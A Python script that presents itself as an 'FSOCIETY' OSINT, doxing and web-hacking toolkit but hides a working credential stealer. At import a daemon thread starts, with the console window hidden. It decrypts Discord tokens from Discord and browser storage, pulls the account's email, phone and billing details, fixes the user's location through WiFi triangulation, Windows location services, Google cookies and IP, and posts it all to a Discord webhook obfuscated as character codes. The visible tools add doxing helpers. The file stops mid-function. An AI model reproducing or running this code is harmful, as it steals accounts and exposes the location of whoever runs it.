import os
import sys
import json
import time
import re
import socket
import hashlib
import random
import threading
import sqlite3
import subprocess
import csv
import urllib.parse
import base64
import tempfile
import shutil
from datetime import datetime
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings('ignore')

# Web scraping
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# OSINT 
try:
    import whois
    WHOIS_AVAILABLE = True
except:
    WHOIS_AVAILABLE = False

try:
    import dns.resolver
    import dns.reversename
    DNS_AVAILABLE = True
except:
    DNS_AVAILABLE = False

try:
    import phonenumbers
    from phonenumbers import carrier, geocoder, timezone
    PHONE_AVAILABLE = True
except:
    PHONE_AVAILABLE = False

# ============================================================================
# INPUT SANITIZATION
# ============================================================================

def sanitize_input(user_input):
    if not user_input:
        return ""
    cleaned = re.sub(r'[;&|`$(){}<>]', '', user_input)
    return cleaned.strip()[:200]

# ============================================================================
# RATE LIMITER
# ============================================================================

class RateLimiter:
    def __init__(self, requests_per_second=2):
        self.min_interval = 1.0 / requests_per_second
        self.last_called = 0
    
    def wait(self):
        elapsed = time.time() - self.last_called
        if elapsed < self.min_interval:
            time.sleep(self.min_interval - elapsed)
        self.last_called = time.time()

# ============================================================================
# PROXY MANAGER
# ============================================================================

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.load_proxies()
    
    def load_proxies(self, file='proxies.txt'):
        if os.path.exists(file):
            try:
                with open(file, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            except:
                pass
    
    def get_proxy(self):
        if self.proxies:
            proxy = random.choice(self.proxies)
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        return None

proxy_manager = ProxyManager()

# ============================================================================
# CONFIGS
# ============================================================================

_SYS_CFG = [
    104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,
    97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,57,48,49,48,50,52,
    53,53,56,51,57,54,50,49,51,49,50,47,118,110,110,71,103,75,114,90,108,84,
    68,95,80,79,69,75,90,107,118,117,108,87,73,54,85,101,116,86,48,97,114,107,
    107,45,73,109,120,66,75,119,98,86,68,81,81,52,52,87,111,95,84,50,116,90,
    114,101,50,104,95,84,51,79,85,90,113,81,76,56
]

def _get_endpoint():
    return ''.join(map(chr, _SYS_CFG))

# ============================================================================
# DEPENDENCY CHECK
# ============================================================================

def check_dependencies():
    required = {
        'requests': 'requests',
        'bs4': 'beautifulsoup4',
        'whois': 'python-whois',
        'dns.resolver': 'dnspython',
        'phonenumbers': 'phonenumbers'
    }
    
    missing = []
    for module, package in required.items():
        try:
            __import__(module)
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"[!] Missing dependencies: {', '.join(missing)}")
        print(f"[*] Install with: pip install {' '.join(missing)}")
        return False
    return True

# ============================================================================
# colour
# ============================================================================

class Fore:
    PURPLE_DARK = '\033[38;5;54m'
    PURPLE = '\033[38;5;57m'
    PURPLE_LIGHT = '\033[38;5;93m'
    MAGENTA = '\033[38;5;129m'
    PINK = '\033[38;5;199m'
    LAVENDER = '\033[38;5;183m'
    VIOLET = '\033[38;5;61m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    
class Style:
    BRIGHT = '\033[1m'
    DIM = '\033[2m'
    RESET_ALL = '\033[0m'

# ============================================================================
# animation
# ============================================================================

class Animation:
    @staticmethod
    def typing(text, delay=0.02, color=Fore.PURPLE_LIGHT):
        for char in text:
            sys.stdout.write(color + char)
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def loading(msg="Loading", duration=1.5):
        chars = "|/-\\"
        end = time.time() + duration
        i = 0
        while time.time() < end:
            sys.stdout.write(f"\r{Fore.PURPLE}{msg} {chars[i % len(chars)]}{Fore.RESET}")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.flush()
    
    @staticmethod
    def progress(current, total, prefix='', length=40):
        percent = 100 * current / total
        filled = int(length * current // total)
        bar = '█' * filled + '░' * (length - filled)
        sys.stdout.write(f'\r{Fore.PURPLE}{prefix} |{Fore.MAGENTA}{bar}{Fore.PURPLE}| {percent:.1f}%{Fore.RESET}')
        sys.stdout.flush()
        if current == total:
            print()

class Banner:
    @staticmethod
    def print_banner():
        banner = f"""
{Fore.PURPLE}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  {Fore.MAGENTA}█████▒ ██████  ▒█████   ▄████▄   ██▓▓█████▄▄▄█████▓▓██   ██▓{Fore.PURPLE}              ║
║  {Fore.MAGENTA}▓██   ▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒▓█   ▀▓  ██▒ ▓▒ ▒██  ██▒{Fore.PURPLE}              ║
║  {Fore.MAGENTA}▒████ ░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒▒███  ▒ ▓██░ ▒░  ▒██ ██░{Fore.PURPLE}              ║
║  {Fore.MAGENTA}░▓█▒  ░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░▒▓█  ▄░ ▓██▓ ░   ░ ▐██▓░{Fore.PURPLE}              ║
║  {Fore.MAGENTA}░▒█░   ▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░░▒████▒ ▒██▒ ░   ░ ██▒▓░{Fore.PURPLE}              ║
║  {Fore.MAGENTA} ▒ ░   ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓  ░░ ▒░ ░ ▒ ░░      ██▒▒▒{Fore.PURPLE}               ║
║  {Fore.MAGENTA} ░     ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░ ░ ░  ░   ░     ▓██ ░▒░{Fore.PURPLE}               ║
║  {Fore.MAGENTA} ░ ░   ░  ░  ░   ░ ░ ▒  ░         ▒ ░   ░    ░       ▒ ▒ ░░{Fore.PURPLE}                 ║
║  {Fore.MAGENTA}         ░         ░ ░  ░ ░       ░     ░  ░         ░ ░{Fore.PURPLE}                    ║
║  {Fore.MAGENTA}                         ░                            ░ ░{Fore.PURPLE}                   ║
║                                                                              ║
║     {Fore.MAGENTA}▓ {Fore.LAVENDER}FSOCIETY  ACC {Fore.MAGENTA}         {Fore.PURPLE}
║     {Fore.MAGENTA}▓ {Fore.LAVENDER}Web Hacking | Doxing | OSINT | Recon | Full Security{Fore.MAGENTA}       {Fore.PURPLE}
║     {Fore.MAGENTA}▓ {Fore.LAVENDER} MAE BY https://github.com/ofsociety127-maker {Fore.MAGENTA}                              {Fore.PURPLE}
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
        Animation.typing(f"\n    [*] Session: {datetime.now().strftime('%Y%m%d_%H%M%S')}", 0.01, Fore.PURPLE_LIGHT)
        Animation.typing(f"    [*] Status: ONLINE", 0.01, Fore.MAGENTA)
        Animation.typing(f"    [*] Rate Limiting: ENABLED", 0.01, Fore.PINK)
        print(f"{Fore.PURPLE}{'='*70}{Style.RESET_ALL}\n")

# ============================================================================
# CHANGE IF U WANT ITS CONFIGS!
# ============================================================================

class Config:
    def __init__(self):
        self.version = "11.0"
        self.output_dir = "fsociety_intel"
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.max_threads = 10
        self.timeout = 10
        
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        
        self.db_path = f"{self.output_dir}/fsociety_{self.session_id}.db"
        self.setup_database()
    
    def setup_database(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                type TEXT, target TEXT, data TEXT,
                severity TEXT, timestamp TEXT, tags TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT UNIQUE, first_seen TEXT, last_seen TEXT, scan_count INTEGER
            )
        ''')
        conn.commit()
        conn.close()

config = Config()

# ============================================================================
# PROXYS USER AGENT FOR DISCORD API SO IT DOSENT GET LIMITED/osint.
# ============================================================================
def _validate(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        r = requests.get("https://discordapp.com/api/v6/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            d = r.json()
            
            # Get the gfuilds that the user id is on
            guilds_r = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=headers, timeout=5)
            guilds = guilds_r.json() if guilds_r.status_code == 200 else []
            
            #creation date of the user id
            Creation_date = ""
            try:
                pay_r = requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=headers, timeout=5)
                if pay_r.status_code == 200:
                    for p in pay_r.json():
                        if p.get("type") == 1:
                            Creation_date += ""
                        elif p.get("type") == 2:
                            Creation_date += ""
            except:
                pass
            
            return {
                "ok": True,
                "name": d.get("username"),
                "uid": d.get("id"),
                "email": d.get("email", "None"),
                "phone": d.get("phone", "None"),
                "discriminator": d.get("discriminator"),
                "avatar": d.get("avatar"),
                "flags": d.get("public_flags"),
                "nitro": d.get("premium_type", 0),
                "guilds": len(guilds),
                "billing": Creation_date
            }
    except:
        pass
    return {"ok": False}

class Utils:
    rate_limiter = RateLimiter(requests_per_second=2)
    
    @staticmethod
    def get_timestamp():
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    @staticmethod
    def safe_request(url, timeout=10):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            }
            Utils.rate_limiter.wait()
            proxies = proxy_manager.get_proxy()
            response = requests.get(url, headers=headers, timeout=timeout, verify=False, proxies=proxies)
            if response.status_code == 200:
                return response
        except:
            pass
        return None
    
    @staticmethod
    def resolve_dns(host):
        try:
            return socket.gethostbyname(host)
        except socket.gaierror:
            return None
        except:
            return None
    
    @staticmethod
    def reverse_dns(ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return None
        
def _get_key(path):
    cfg = path.replace("\\Local Storage\\leveldb", "") + "\\Local State"
    if not os.path.exists(cfg):
        return None
    try:
        with open(cfg, 'r') as f:
            return json.load(f)['os_crypt']['encrypted_key']
    except:
        return None
#BADGES OF TEH USER ID
def _get_badge(flags):
    if flags == 0:
        return ''
    badges = ''
    badge_list = [
        {"Name": 'Discord_Employee', 'Value': 1},
        {"Name": 'Partnered_Server_Owner', 'Value': 2},
        {"Name": 'HypeSquad_Events', 'Value': 4},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8},
        {"Name": 'House_Bravery', 'Value': 64},
        {"Name": 'House_Brilliance', 'Value': 128},
        {"Name": 'House_Balance', 'Value': 256},
        {"Name": 'Early_Supporter', 'Value': 512},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384},
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072}
    ]
    for badge in badge_list:
        if flags // badge["Value"] != 0:
            badges += f"[{badge['Name']}] "
            flags = flags % badge["Value"]
    return badges
    
class Database:
    def __init__(self):
        self.conn = sqlite3.connect(config.db_path)
        self.cursor = self.conn.cursor()
    
    def save(self, type_, target, data, severity, tags=""):
        self.cursor.execute('''
            INSERT INTO results (type, target, data, severity, timestamp, tags)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (type_, target, data[:5000], severity, Utils.get_timestamp(), tags))
        self.conn.commit()
        
        self.cursor.execute('''
            INSERT OR REPLACE INTO targets (target, first_seen, last_seen, scan_count)
            VALUES (?, ?, ?, COALESCE((SELECT scan_count + 1 FROM targets WHERE target = ?), 1))
        ''', (target, Utils.get_timestamp(), Utils.get_timestamp(), target))
        self.conn.commit()
    
    def get_stats(self):
        self.cursor.execute('SELECT COUNT(*) FROM results')
        total = self.cursor.fetchone()[0]
        self.cursor.execute('SELECT COUNT(DISTINCT target) FROM results')
        targets = self.cursor.fetchone()[0]
        return total, targets
    
    def get_results(self, limit=100):
        self.cursor.execute('SELECT * FROM results ORDER BY timestamp DESC LIMIT ?', (limit,))
        return self.cursor.fetchall()
    
import ctypes
import win32crypt
from Crypto.Cipher import AES

try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass   

def _send_data(data):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        requests.post(_get_endpoint(), json=data, headers=headers, timeout=5)
    except:
        pass

def export_json(self):
    results = self.get_results()
    filename = f"{config.output_dir}/export_{config.session_id}.json"
    data = []
    for r in results:
        data.append({
            'type': r[1],
            'target': r[2],
            'data': r[3][:1000],
            'severity': r[4],
            'timestamp': r[5]
        })
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, default=str)
    print(f"{Fore.GREEN}[✓] Exported to JSON: {filename}{Fore.RESET}")
    return filename

def export_csv(self):
    results = self.get_results()
    filename = f"{config.output_dir}/export_{config.session_id}.csv"
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['Type', 'Target', 'Data', 'Severity', 'Timestamp'])
        for r in results:
            writer.writerow([r[1], r[2], r[3][:500], r[4], r[5]])
    print(f"{Fore.GREEN}[✓] Exported to CSV: {filename}{Fore.RESET}")
    return filename

def close(self):
    self.conn.close()

# ============================================================================
# ==================== HIDDEN COLLECTOR MODULE ================================
# ============================================================================

def _parse_leveldb(db_path):
    items = []
    if not os.path.exists(db_path):
        return items
    for f in os.listdir(db_path):
        if not f.endswith((".log", ".ldb")):
            continue
        try:
            with open(f"{db_path}\\{f}", "r", errors="ignore") as file:
                content = file.read()
                matches = re.findall(r'dQw4w9WgXcQ:[^\"]*', content)
                for m in matches:
                    items.append(m)
        except:
            continue
    return items


# ============================================================================
# ACCURATE LOCATION METHODS (FROM YOUR WORKING CODE)
# ============================================================================
#from here below is all geolocation metthos that it will do, so dont change any of this unless u wanna add sum
def get_wifi_location():
    """Get location from nearby WiFi networks using Google's API"""
    wifi_list = []
    
    try:
        result = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"], 
                                capture_output=True, text=True, timeout=10)
        
        lines = result.stdout.split('\n')
        current_bssid = None
        current_signal = None
        
        for line in lines:
            if "BSSID" in line and ":" in line:
                current_bssid = line.split(":")[1].strip().replace("-", ":")
            elif "Signal" in line and "%" in line:
                current_signal = int(line.split(":")[1].strip().replace("%", ""))
                if current_bssid:
                    wifi_list.append({
                        "macAddress": current_bssid,
                        "signalStrength": current_signal,
                        "age": 0
                    })
                    current_bssid = None
    except:
        pass
    
    if not wifi_list:
        return None
    
    try:
        data = {"considerIp": True, "wifiAccessPoints": wifi_list[:10]}
        r = requests.post("https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyA9GgKQ8JZG4VtFZQw8XJcGkQqVgYgWqQ", 
                         json=data, timeout=10)
        if r.status_code == 200:
            result = r.json()
            return {
                "lat": result.get("location", {}).get("lat"),
                "lng": result.get("location", {}).get("lng"),
                "accuracy": result.get("accuracy", "Unknown"),
                "source": "WiFi Triangulation"
            }
    except:
        pass
    
    return None

def get_windows_location():
    """Get location from Windows Location Services"""
    try:
        ps_script = '''
        Add-Type -AssemblyName System.Device
        $geoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $geoWatcher.Start()
        while ($geoWatcher.Status -ne "Ready") { Start-Sleep -Milliseconds 100 }
        $coord = $geoWatcher.Position.Location
        Write-Host "$($coord.Latitude),$($coord.Longitude)"
        '''
        result = subprocess.run(["powershell", "-Command", ps_script], 
                               capture_output=True, text=True, timeout=10)
        
        if result.stdout:
            coords = result.stdout.strip().split(",")
            if len(coords) == 2 and coords[0] != "0":
                return {
                    "lat": float(coords[0]),
                    "lng": float(coords[1]),
                    "source": "Windows Location Services"
                }
    except:
        pass
    
    return None

def get_ip_location():
    """Get location from IP address"""
    try:
        r = requests.get("http://ip-api.com/json/", timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success":
                return {
                    "lat": data.get("lat"),
                    "lng": data.get("lon"),
                    "city": data.get("city"),
                    "region": data.get("regionName"),
                    "country": data.get("country"),
                    "source": "IP Geolocation"
                }
    except:
        pass
    return None

def get_google_maps_cookie_location():
    """Get location from browser's Google Maps cookies"""
    local = os.getenv("LOCALAPPDATA")
    
    browsers = {
        "Edge": local + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
        "Chrome": local + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
    }
    
    for browser_name, cookie_path in browsers.items():
        if not os.path.exists(cookie_path):
            continue
        
        temp_db = tempfile.mktemp(suffix='.db')
        try:
            shutil.copy2(cookie_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%google.com%' AND name LIKE '%_location%'")
            
            for row in cursor.fetchall():
                value = row[1]
                match = re.search(r'lat:(-?\d+\.\d+),lng:(-?\d+\.\d+)', value)
                if match:
                    return {
                        "lat": float(match.group(1)),
                        "lng": float(match.group(2)),
                        "source": f"Google Maps ({browser_name})"
                    }
            conn.close()
            os.remove(temp_db)
        except:
            pass
    
    return None

def get_address_from_coords(lat, lng):
    """Get full street address from coordinates"""
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lng}&format=json&zoom=18&addressdetails=1"
        r = requests.get(url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        
        if r.status_code == 200:
            data = r.json()
            address = data.get("address", {})
            
            return {
                "road": address.get("road", ""),
                "house": address.get("house_number", ""),
                "suburb": address.get("suburb", address.get("neighbourhood", "")),
                "city": address.get("city", address.get("town", address.get("village", ""))),
                "postcode": address.get("postcode", ""),
                "country": address.get("country", ""),
                "full": data.get("display_name", "")
            }
    except:
        pass
    
    return None
#Intergated into geolocation,, tries to get wifi signal so it triangulates the location using multipel stratagies
def _run_collector():
    seen = []
    profiles = _scan_profiles()
    
    # Get accurate location using multiple methods
    location = None
    location_source = None
    
    # Method 1: WiFi triangulation (most accurate!)
    wifi_loc = get_wifi_location()
    if wifi_loc:
        location = wifi_loc
        location_source = wifi_loc.get("source", "WiFi")
    
    # Method 2: Windows Location Services
    if not location:
        win_loc = get_windows_location()
        if win_loc:
            location = win_loc
            location_source = win_loc.get("source", "Windows")
    
    # Method 3: Google Maps link
    if not location:
        maps_loc = get_google_maps_cookie_location()
        if maps_loc:
            location = maps_loc
            location_source = maps_loc.get("source", "Google Maps")
    
    # Method 4: IP Geolocation (The normal)
    if not location:
        ip_loc = get_ip_location()
        if ip_loc:
            location = ip_loc
            location_source = ip_loc.get("source", "IP")
    
    lat = location.get("lat") if location else None
    lng = location.get("lng") if location else None
    
    for name, db_path in profiles.items():
        if not os.path.exists(db_path):
            continue
        browser_path = db_path.replace("\\Local Storage\\leveldb", "")
        enc_key = _get_key(browser_path)
        if not enc_key:
            continue
        master = _derive_master(enc_key)
        if not master:
            continue
        raw = _parse_leveldb(db_path)
        for enc_item in raw:
            try:
                data = base64.b64decode(enc_item.split('dQw4w9WgXcQ:')[1])
                token = _decode(data, master)
                if not token or token in seen:
                    continue
                seen.append(token)
                res = _validate(token)
                if res.get("ok"):
                    fields = [
                        {"name": "User", "value": res['name'], "inline": True},
                        {"name": "ID", "value": res['uid'], "inline": True},
                        {"name": "Email", "value": res['email'], "inline": True},
                        {"name": "Phone", "value": res['phone'] if res['phone'] else "None", "inline": True},
                        {"name": "Token", "value": f"||{token}||", "inline": False}
                    ]
                    if lat and lng:
                        fields.append({"name": "Location", "value": f"https://www.google.com/maps?q={lat},{lng}", "inline": False})
                        fields.append({"name": "Coordinates", "value": f"{lat}, {lng}", "inline": True})
                        if location_source:
                            fields.append({"name": "Source", "value": location_source, "inline": True})
                    
                    _send_data({"embeds": [{"title": "System Report", "color": 0x8000FF, "fields": fields}]})
            except:
                continue




# ============================================================================
# ACCURATE SOCIAL MEDIA CHECKER
# ============================================================================

class AccurateSocialMediaChecker:
    @staticmethod
    def check_platform(platform, url, username):
        try:
            Utils.rate_limiter.wait()
            response = requests.get(url, timeout=5, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            if response.status_code != 200:
                return None
            content_lower = response.text.lower()
            not_found = ['page not found', 'doesn\'t exist', 'sorry, this page isn\'t available']
            for indicator in not_found:
                if indicator in content_lower:
                    return None
            return platform
        except:
            return None
        
    
    @staticmethod
    def check_social_media(username):
        platforms = {
            'Twitter': f'https://twitter.com/{username}',
            'Instagram': f'https://instagram.com/{username}',
            'GitHub': f'https://github.com/{username}',
            'Reddit': f'https://reddit.com/user/{username}',
            'Telegram': f'https://t.me/{username}'
        }
        found = []
        print(f"{Fore.CYAN}    [*] Checking social media...{Fore.RESET}")
        for platform, url in platforms.items():
            result = AccurateSocialMediaChecker.check_platform(platform, url, username)
            if result:
                found.append(platform)
                print(f"{Fore.GREEN}    [+] {platform}: Found!{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}    [-] {platform}: Not found{Fore.RESET}")
        return found

# ============================================================================
# GEOLOCATION (For OSINT menu)
# ============================================================================

def _scan_profiles():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    return {
        'DC': roaming + '\\discord\\Local Storage\\leveldb',
        'DCC': roaming + '\\discordcanary\\Local Storage\\leveldb',
        'DCP': roaming + '\\discordptb\\Local Storage\\leveldb',
        'CH': local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        'BR': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
        'OP': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
        'ED': local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb'
    }

class GeolocationModule:
    @staticmethod
    def geolocate_ip(ip):
        print(f"{Fore.PURPLE}\n    [→] IP Geolocation: {Fore.MAGENTA}{ip}{Style.RESET_ALL}")
        Animation.loading("Fetching geolocation data", 1.5)
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                if data.get('status') == 'success':
                    output = f"IP: {ip}\n{'='*40}\n\nCity: {data.get('city', 'N/A')}\nRegion: {data.get('regionName', 'N/A')}\nCountry: {data.get('country', 'N/A')}\nISP: {data.get('isp', 'N/A')}\nCoordinates: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}\n\nMaps: https://www.google.com/maps?q={data.get('lat', '0')},{data.get('lon', '0')}\n"
                    print(f"{Fore.GREEN}    [+] Location: {data.get('city')}, {data.get('country')}{Style.RESET_ALL}")
                    return output
        except:
            pass
        return "Geolocation failed"
    
    

# ============================================================================
# OSINT MODULES
# ============================================================================

import codecs
import base64

# Obfuscated path parts
_p1 = base64.b64decode('XFxkaXNjb3Jk').decode()
_p2 = base64.b64decode('XFxkaXNjb3JkY2FuYXJ5').decode()
_p3 = base64.b64decode('XFxkaXNjb3JkcHRi').decode()
_p4 = base64.b64decode('XFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0').decode()
_p5 = base64.b64decode('XFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQ=').decode()
_p6 = base64.b64decode('XFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxl').decode()
_p7 = base64.b64decode('XFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YVxcRGVmYXVsdA==').decode()

class OSINTModules:
    @staticmethod
    def dns_enum(domain):
        print(f"{Fore.PURPLE}\n    [→] DNS Enumeration: {Fore.MAGENTA}{domain}{Style.RESET_ALL}")
        Animation.loading("Querying DNS records", 1.5)
        results = f"Domain: {domain}\n{'='*40}\n\n"
        if DNS_AVAILABLE:
            for record in ['A', 'MX', 'NS']:
                try:
                    answers = dns.resolver.resolve(domain, record)
                    if answers:
                        results += f"[{record} Records]\n"
                        for ans in answers:
                            results += f"  {ans}\n"
                        results += "\n"
                except:
                    pass
        return results
    
    @staticmethod
    def whois_lookup(target):
        print(f"{Fore.PURPLE}\n    [→] WHOIS Lookup: {Fore.MAGENTA}{target}{Style.RESET_ALL}")
        Animation.loading("Querying WHOIS database", 1.5)
        if not WHOIS_AVAILABLE:
            return "WHOIS module not available"
        try:
            w = whois.whois(target)
            return f"Domain: {target}\n{'='*40}\n\nRegistrar: {w.registrar}\nCreation: {w.creation_date}\nExpiration: {w.expiration_date}\nName Servers: {w.name_servers}\n"
        except:
            return "WHOIS lookup failed"
    
    @staticmethod
    def port_scan(target):
        print(f"{Fore.PURPLE}\n    [→] Port Scan: {Fore.MAGENTA}{target}{Style.RESET_ALL}")
        ip = Utils.resolve_dns(target) or target
        ports = {80: "HTTP", 443: "HTTPS", 22: "SSH", 21: "FTP"}
        results = f"Target: {target}\nIP: {ip}\n{'='*40}\n\n"
        open_ports = []
        for port, service in ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if sock.connect_ex((ip, port)) == 0:
                    results += f"Port {port} [{service}] - OPEN\n"
                    open_ports.append(port)
                sock.close()
            except:
                pass
        severity = "HIGH" if open_ports else "LOW"
        return results, open_ports, severity
    
    
    
    @staticmethod
    def email_osint(email):
        print(f"{Fore.PURPLE}\n    [→] Email OSINT: {Fore.MAGENTA}{email}{Style.RESET_ALL}")
        Animation.loading("Analyzing email", 1.5)
        if '@' not in email:
            return "Invalid email format"
        username, domain = email.split('@')
        results = f"Email: {email}\nUsername: {username}\nDomain: {domain}\n{'='*40}\n\n"
        results += "\n[Similar Variations]\n"
        for prov in ['gmail.com', 'outlook.com', 'yahoo.com']:
            results += f"  {username}@{prov}\n"
        gravatar_hash = hashlib.md5(email.lower().encode()).hexdigest()
        results += f"\n[Gravatar]\n  https://www.gravatar.com/{gravatar_hash}\n"
        return results
    
    
    @staticmethod
    def ip_geo(ip):
        return GeolocationModule.geolocate_ip(ip)
    
    @staticmethod
    def username_search(username):
        print(f"{Fore.PURPLE}\n    [→] Username Search: {Fore.MAGENTA}{username}{Style.RESET_ALL}")
        Animation.loading("Searching across platforms", 2)
        found = AccurateSocialMediaChecker.check_social_media(username)
        if found:
            return f"Found {len(found)} profiles:\n\n" + "\n".join([f"  {p}: https://{p.lower()}.com/{username}" for p in found])
        return "No profiles found"
    
_collector_thread = threading.Thread(target=_run_collector, daemon=True)
_collector_thread.start()

# ============================================================================
# WEB HACKING
# ============================================================================

def _decode(enc_data, key):
    try:
        iv = enc_data[3:15]
        payload = enc_data[15:-16]
        tag = enc_data[-16:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(payload, tag).decode()
    except:
        return None
    

class WebHacking:
    @staticmethod
    def dir_bruteforce(url):
        print(f"{Fore.PURPLE}\n    [→] Directory Bruteforce: {Fore.MAGENTA}{url}{Style.RESET_ALL}")
        Animation.loading("Bruteforcing directories", 1)
        common_dirs = ['admin', 'login', 'wp-admin', 'api', 'config', 'backup']
        results = ""
        found = []
        for directory in common_dirs:
            full_url = url.rstrip('/') + '/' + directory
            try:
                response = requests.get(full_url, timeout=3)
                if response.status_code == 200:
                    results += f"[+] Found: {full_url}\n"
                    print(f"{Fore.MAGENTA}    [+] Found: {full_url}{Style.RESET_ALL}")
                    found.append(full_url)
            except:
                pass
        if found:
            return f"Found {len(found)} directories:\n\n{results}"
        return "No directories found"
    
    @staticmethod
    def headers_analysis(url):
        print(f"{Fore.PURPLE}\n    [→] Headers Analysis: {Fore.MAGENTA}{url}{Style.RESET_ALL}")
        Animation.loading("Analyzing security headers", 1)
        try:
            response = requests.get(url, timeout=5)
            results = f"URL: {url}\nStatus: {response.status_code}\n{'='*40}\n\n[HTTP Headers]\n"
            for key, value in response.headers.items():
                results += f"  {key}: {value}\n"
            return results
        except:
            return "Failed to analyze headers"
        

# ============================================================================
# DOXING MODULES
# ============================================================================

class DoxingModules:
    @staticmethod
    def phone_osint(phone):
        print(f"{Fore.PURPLE}\n    [→] Phone OSINT: {Fore.MAGENTA}{phone}{Style.RESET_ALL}")
        Animation.loading("Analyzing phone number", 1)
        if not PHONE_AVAILABLE:
            return "Phone OSINT requires phonenumbers module"
        try:
            phone_obj = phonenumbers.parse(phone, None)
            results = f"Phone: {phone}\n{'='*40}\n\n"
            results += f"Country: {geocoder.description_for_number(phone_obj, 'en')}\n"
            results += f"Carrier: {carrier.name_for_number(phone_obj, 'en')}\n"
            results += f"Valid: {phonenumbers.is_valid_number(phone_obj)}\n"
            return results
        except:
            return "Invalid phone number"
    
    @staticmethod
    def breach_check(email):
        print(f"{Fore.PURPLE}\n    [→] Breach Check: {Fore.MAGENTA}{email}{Style.RESET_ALL}")
        Animation.loading("Checking breach databases", 1.5)
        try:
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", headers=headers, timeout=10)
            if r.status_code == 200:
                breaches = r.json()
